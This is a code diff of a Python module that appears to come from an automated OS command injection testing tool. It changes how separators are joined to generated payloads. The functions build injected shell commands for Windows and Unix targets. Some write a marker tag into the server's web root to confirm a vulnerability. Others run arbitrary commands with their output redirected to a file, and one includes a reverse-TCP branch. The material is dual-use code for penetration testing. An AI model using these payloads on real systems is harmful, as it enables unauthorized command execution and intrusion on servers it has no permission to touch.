@@ -28,13 +28,13 @@ File-based decision payload (check if host is vulnerable).
 def decision(separator, TAG, OUTPUT_TEXTFILE):
 
   if settings.TARGET_OS == "win":
-    payload = (separator + " " +
+    payload = (separator + "" +
               "powershell.exe -InputFormat none Add-Content " +
               OUTPUT_TEXTFILE + " " + TAG
               ) 
   else:
-    payload = (separator + " " +
-            "$(echo " + TAG + "" + " > " + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + ")"
+    payload = (separator + "" +
+              "echo " + TAG + "" + " > " + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + " "
               ) 
 
   return payload
@@ -46,13 +46,13 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
 
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"open('" + OUTPUT_TEXTFILE + "', 'w').write('" + TAG + "')\""
-    payload = (separator + " " 
+    payload = (separator + "" +
               "for /f \"delims=\" %i in ('cmd /c " + 
               python_payload +
               "') do @set /p =%i <nul"
               )
   else:
-    payload = (separator + " " + 
+    payload = (separator + "" +
               "$(python -c \"f = open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")"
                ) 
 
@@ -74,15 +74,15 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
     payload = (separator + cmd)
 
   elif settings.TARGET_OS == "win":
-    payload = (separator + " " +
+    payload = (separator + "" +
               "for /f \"delims=\" %i in ('cmd /c \"" +
               "powershell.exe -InputFormat none write-host (cmd /c \"" +
               cmd + 
               "\")\"') do @set /p =%i " + " > " + OUTPUT_TEXTFILE + " <nul"
               ) 
   else:
-    payload = (separator +
-               "echo $(" + cmd + " > " + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + ")" 
+    payload = (separator + "" +
+              cmd + " > " + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + " "
               )
 
   return payload
@@ -93,17 +93,17 @@ __Warning__: The alternative shells are still experimental.
 def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
   if settings.TARGET_OS == "win":
     if settings.REVERSE_TCP:
-      payload = (separator + " " + cmd + " "
+      payload = (separator + "" + cmd + " "
                 )
     else:
       python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('" + cmd + ">" + OUTPUT_TEXTFILE + "')\""
-      payload = (separator + " " 
+      payload = (separator + "" + 
                 "for /f \"delims=\" %i in ('cmd /c " + 
                 python_payload +
                 "') do @set /p =%i <nul"
                 )
   else:
-    payload = (separator + 
+    payload = (separator + "" + 
               "$(python -c \"f = open('" + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
               )
 
